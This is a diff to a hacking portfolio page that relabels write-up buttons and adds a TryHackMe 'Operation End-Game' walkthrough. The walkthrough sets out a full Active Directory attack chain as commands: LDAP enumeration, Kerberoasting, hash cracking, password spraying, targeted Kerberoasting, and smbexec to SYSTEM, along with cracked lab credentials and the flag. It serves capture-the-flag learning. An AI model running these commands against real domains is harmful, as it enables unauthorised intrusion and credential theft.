@@ -70,7 +70,7 @@
             <p class="eyebrow">Featured Resource</p>
             <h3>Tony the Tiger</h3>
             <img class="hacking-feature-image" src="assets/tonythetiger.png" alt="Tony the Tiger" />
-            <a class="btn" href="https://www.notion.so/Tony-the-Tiger-302ca0ef4e7a80569f3cc79b9ef23682?source=copy_link" target="_blank" rel="noreferrer">Open Notion</a>
+            <a class="btn" href="https://www.notion.so/Tony-the-Tiger-302ca0ef4e7a80569f3cc79b9ef23682?source=copy_link" target="_blank" rel="noreferrer">Open Write-Up</a>
             <details class="hacking-notes">
               <summary class="btn ghost">Show Me The Notes</summary>
               <div class="hacking-notes-body">
@@ -216,7 +216,7 @@ reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></pre>
             <p class="eyebrow">Featured Resource</p>
             <h3>h4cked</h3>
             <img class="hacking-feature-image" src="assets/h4cked.png" alt="h4cked room graphic" />
-            <a class="btn" href="https://www.notion.so/h4cked-322ca0ef4e7a80bdbed5f284e46e6bd3?source=copy_link" target="_blank" rel="noreferrer">Open Notion</a>
+            <a class="btn" href="https://www.notion.so/h4cked-322ca0ef4e7a80bdbed5f284e46e6bd3?source=copy_link" target="_blank" rel="noreferrer">Open Write-Up</a>
             <details class="hacking-notes">
               <summary class="btn ghost">Show Me The Notes</summary>
               <div class="hacking-notes-body">
@@ -299,7 +299,7 @@ Password: password123</code></pre>
             <p class="eyebrow">Featured Resource</p>
             <h3>Opacity</h3>
             <img class="hacking-feature-image" src="assets/opacity.png" alt="Opacity room graphic" />
-            <a class="btn" href="https://www.notion.so/Opacity-327ca0ef4e7a80e39a61c9abe1359374?source=copy_link" target="_blank" rel="noreferrer">Open Notion</a>
+            <a class="btn" href="https://www.notion.so/Opacity-327ca0ef4e7a80e39a61c9abe1359374?source=copy_link" target="_blank" rel="noreferrer">Open Write-Up</a>
             <details class="hacking-notes">
               <summary class="btn ghost">Show Me The Notes</summary>
               <div class="hacking-notes-body">
@@ -377,7 +377,7 @@ stty raw -echo; fg</code></pre>
             <p class="eyebrow">Featured Resource</p>
             <h3>Pyrat</h3>
             <img class="hacking-feature-image" src="assets/pyrat.png" alt="Pyrat room graphic" />
-            <a class="btn" href="https://www.notion.so/Pyrat-231ca0ef4e7a8020ac4ad24f9f6bbb8c?source=copy_link" target="_blank" rel="noreferrer">Open Notion</a>
+            <a class="btn" href="https://www.notion.so/Pyrat-231ca0ef4e7a8020ac4ad24f9f6bbb8c?source=copy_link" target="_blank" rel="noreferrer">Open Write-Up</a>
             <details class="hacking-notes">
               <summary class="btn ghost">Show Me The Notes</summary>
               <div class="hacking-notes-body">
@@ -449,7 +449,7 @@ getcap -r / 2&gt;/dev/null</code></pre>
             <p class="eyebrow">Featured Resource</p>
             <h3>Lian_Yu</h3>
             <img class="hacking-feature-image" src="assets/lian-yu.jpeg" alt="Lian Yu island graphic" />
-            <a class="btn" href="https://www.notion.so/Lian_Yu-33cca0ef4e7a808a93c8f6e564908947?source=copy_link" target="_blank" rel="noreferrer">Open Notion</a>
+            <a class="btn" href="https://www.notion.so/Lian_Yu-33cca0ef4e7a808a93c8f6e564908947?source=copy_link" target="_blank" rel="noreferrer">Open Write-Up</a>
             <details class="hacking-notes">
               <summary class="btn ghost">Show Me The Notes</summary>
               <div class="hacking-notes-body">
@@ -546,6 +546,127 @@ get aa.jpg</code></pre>
 
                 <h5>Conclusion</h5>
                 <p>This walkthrough follows a clean attack chain: enumerate, discover, decode, access, and analyze. The file-header repair step is what turns it from a basic enumeration challenge into a useful lesson in data recovery and content inspection.</p>
+              </div>
+            </details>
+          </article>
+
+          <article class="card hacking-note-card hacking-feature-card">
+            <p class="eyebrow">Featured Resource</p>
+            <h3>Operation End-Game</h3>
+            <img class="hacking-feature-image" src="assets/operation-end-game.png" alt="Operation End-Game server graphic" />
+            <a class="btn" href="https://app.notion.com/p/OPERATION-END-GAME-3ddca0ef4e7a8045b1f8e803936750b3?source=copy_link" target="_blank" rel="noreferrer">Open Write-Up</a>
+            <details class="hacking-notes">
+              <summary class="btn ghost">Show Me The Notes</summary>
+              <div class="hacking-notes-body">
+                <h4>Operation End-Game - TryHackMe Write-Up</h4>
+                <h5>Overview</h5>
+                <p>This was a Windows Active Directory box for <code>thm.local</code>. The path was LDAP enumeration, guest access, Kerberoasting, password reuse, BloodHound object-control abuse, targeted Kerberoasting, RDP access, and finally admin command execution with <code>smbexec.py</code>.</p>
+
+                <h5>Target Summary</h5>
+                <pre><code>Domain: thm.local
+Host: ad.thm.local
+OS: Windows Server 2019 / Windows 10 build 17763
+Key services: DNS, Kerberos, LDAP, SMB, RDP, Global Catalog</code></pre>
+
+                <h5>1. Full TCP Scan</h5>
+                <pre><code>nmap -sV -sC -vv -T4 -p- 10.64.181.217</code></pre>
+                <p>I ran this to discover every TCP port, identify service versions, and run default scripts. The scan showed a domain controller with ports like <code>53</code>, <code>88</code>, <code>389</code>, <code>445</code>, <code>3268</code>, and <code>3389</code>. LDAP and RDP leaked the domain and hostname: <code>thm.local</code> and <code>ad.thm.local</code>.</p>
+
+                <h5>2. LDAP User Enumeration</h5>
+                <pre><code>ldapsearch -x -H ldap://10.67.128.6 -b "DC=thm,DC=local" -s sub "(objectClass=user)" sAMAccountName | grep sAMAccountName</code></pre>
+                <p>I ran this to pull domain usernames through LDAP. Getting a user list was important for AS-REP roasting, Kerberoasting, password reuse checks, and later BloodHound work.</p>
+
+                <h5>3. Service Account Filtering</h5>
+                <pre><code>ldapsearch -x -H ldap://10.67.128.6 -b "DC=thm,DC=local" -s sub "(&(objectClass=user)(sAMAccountName=*SA))" description sAMAccountName</code></pre>
+                <p>I filtered for accounts ending in <code>SA</code> because that can hint at service accounts. The output showed accounts inside interesting OUs like <code>Tier 0</code>, <code>Tier 1</code>, <code>Admin</code>, <code>Stage</code>, and <code>ServiceAccounts</code>.</p>
+
+                <h5>4. AS-REP Roast Check</h5>
+                <pre><code>GetNPUsers.py thm.local/ -dc-ip 10.67.128.6 -request</code></pre>
+                <p>I ran this to find users without Kerberos pre-authentication. It returned AS-REP roastable users including <code>SHELLEY_BEARD</code>, <code>ISIAH_WALKER</code>, <code>QUEEN_GARNER</code>, <code>PHYLLIS_MCCOY</code>, and <code>MAXINE_FREEMAN</code>. This was a valid possible path, but the successful route continued through Kerberoasting.</p>
+
+                <h5>5. Guest SMB And LDAP Access</h5>
+                <pre><code>nxc smb 10.67.128.6 -u guest -p ''
+nxc ldap 10.67.128.6 -u 'guest' -p ''</code></pre>
+                <p>I tested whether Guest worked with a blank password. Both SMB and LDAP authentication succeeded, which meant guest-level authenticated enumeration and Kerberos requests were possible.</p>
+
+                <h5>6. Kerberoast As Guest</h5>
+                <pre><code>nxc ldap 10.67.128.6 -u 'guest' -p '' --kerberoasting kerberoastables.txt
+cat kerberoastables.txt</code></pre>
+                <p>I used guest LDAP access to request TGS hashes for SPN accounts. The result identified <code>CODY_ROY</code> as Kerberoastable and saved the hash into <code>kerberoastables.txt</code>.</p>
+
+                <h5>7. Crack Cody's Hash</h5>
+                <pre><code>john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+                <p>John cracked the TGS hash and recovered:</p>
+                <pre><code>CODY_ROY : MKO)mko0</code></pre>
+                <p>This was the first real domain credential.</p>
+
+                <h5>8. BloodHound Collection</h5>
+                <pre><code>bloodhound-ce-python -u 'cody_roy@thm.local' -p 'MKO)mko0' --zip -dc ad.thm.local -c All -d thm.local -ns 10.67.128.6 --dns-timeout 10 --dns-tcp</code></pre>
+                <p>I ran BloodHound collection to turn domain objects into an attack graph. The collection found hundreds of users, groups, OUs, and the domain computer. This revealed that <code>ZACHARY_HUNT</code> had object control over <code>JERRI_LANCASTER</code>.</p>
+
+                <h5>9. Kerberoast Again As Cody</h5>
+                <pre><code>GetUserSPNs.py -request -dc-ip ad.thm.local thm.local/cody_roy:'MKO)mko0'</code></pre>
+                <p>I ran Impacket's SPN query with Cody's valid credentials to look for additional service accounts. It showed SPNs for <code>CHRISTIAN_SANFORD</code> and <code>CODY_ROY</code>, both tied to Remote Desktop Users.</p>
+
+                <h5>10. Build User List And Spray For Reuse</h5>
+                <pre><code>nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users
+nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users | awk '{print $5}' | grep -v "Username" &gt; names.txt
+nxc smb ad.thm.local -u names.txt -p 'MKO)mko0' --continue-on-success</code></pre>
+                <p>I enumerated users, saved usernames into <code>names.txt</code>, and sprayed Cody's password to test password reuse. This found another valid user:</p>
+                <pre><code>ZACHARY_HUNT : MKO)mko0</code></pre>
+
+                <h5>11. Targeted Kerberoast Jerri</h5>
+                <pre><code>python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-ip 10.65.153.33 --request-user JERRI_LANCASTER</code></pre>
+                <p>BloodHound showed Zachary had object control over Jerri, so I used targeted Kerberoasting. The tool temporarily added an SPN to Jerri, requested a TGS hash, printed it, and removed the SPN afterward.</p>
+
+                <h5>12. Crack Jerri's Hash</h5>
+                <pre><code>hashcat -m 13100 -a 0 jerri-lancaster /usr/share/wordlists/rockyou.txt</code></pre>
+                <p>Hashcat cracked Jerri's Kerberos TGS hash:</p>
+                <pre><code>JERRI_LANCASTER : lovinlife!</code></pre>
+                <p>This mattered because BloodHound showed Jerri belonged to <code>REMOTE DESKTOP USERS</code>.</p>
+
+                <h5>13. RDP As Jerri</h5>
+                <pre><code>xfreerdp /v:ad.thm.local /u:'jerri_lancaster' /p:'lovinlife!' /dynamic-resolution /clipboard /cert:ignore</code></pre>
+                <p>I used RDP to get an interactive Windows session. From there, local enumeration led to <code>C:\Scripts</code>.</p>
+
+                <h5>14. Local Windows Enumeration</h5>
+                <pre><code>cd C:/
+ls
+dir
+dir C:\Scripts
+type C:\Scripts\syncer.ps1</code></pre>
+                <p><code>ls</code> failed because this was Windows <code>cmd.exe</code>, so I used <code>dir</code>. The <code>C:\Scripts</code> folder contained <code>syncer.ps1</code>. Reading it exposed an AD synchronization script with hardcoded credentials for <code>SANFORD_DAUGHERTY</code>.</p>
+                <pre><code>SANFORD_DAUGHERTY : RESET_ASAP123</code></pre>
+
+                <h5>15. Final Shell With SMBExec</h5>
+                <pre><code>smbexec.py 'THM.LOCAL/SANFORD_DAUGHERTY:RESET_ASAP123@ad.thm.local@ad.thm.local'
+whoami
+type C:\Users\Administrator\Desktop\flag.txt.txt</code></pre>
+                <p>The recovered credential had enough privilege for <code>smbexec.py</code> to launch a shell. <code>whoami</code> returned:</p>
+                <pre><code>nt authority\system</code></pre>
+                <p>The final flag was:</p>
+                <pre><code>THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}</code></pre>
+
+                <h5>Screenshot Analysis</h5>
+                <p>The server graphic is only a room/card image. The BloodHound screenshots prove the real attack path: Zachary had outbound object control to Jerri, and Jerri was in Remote Desktop Users. The RDP screenshots show the local Windows session, the discovery of <code>C:\Scripts\syncer.ps1</code>, and the exposed <code>SANFORD_DAUGHERTY</code> credential that enabled final SYSTEM access.</p>
+
+                <h5>Attack Chain</h5>
+                <pre><code>nmap
+-&gt; LDAP user enumeration
+-&gt; guest SMB/LDAP access
+-&gt; Kerberoast CODY_ROY
+-&gt; crack Cody
+-&gt; BloodHound collection
+-&gt; password reuse to ZACHARY_HUNT
+-&gt; targeted Kerberoast JERRI_LANCASTER
+-&gt; crack Jerri
+-&gt; RDP as Jerri
+-&gt; find syncer.ps1 credential
+-&gt; smbexec as SANFORD_DAUGHERTY
+-&gt; NT AUTHORITY\SYSTEM</code></pre>
+
+                <h5>Key Lessons</h5>
+                <p>Guest LDAP access can be dangerous, Kerberoasting remains powerful when service passwords are weak, password reuse can turn one cracked account into a pivot, BloodHound is excellent for finding object-control paths, and scripts with plaintext credentials are a direct privilege-escalation risk.</p>
               </div>
             </details>
           </article>
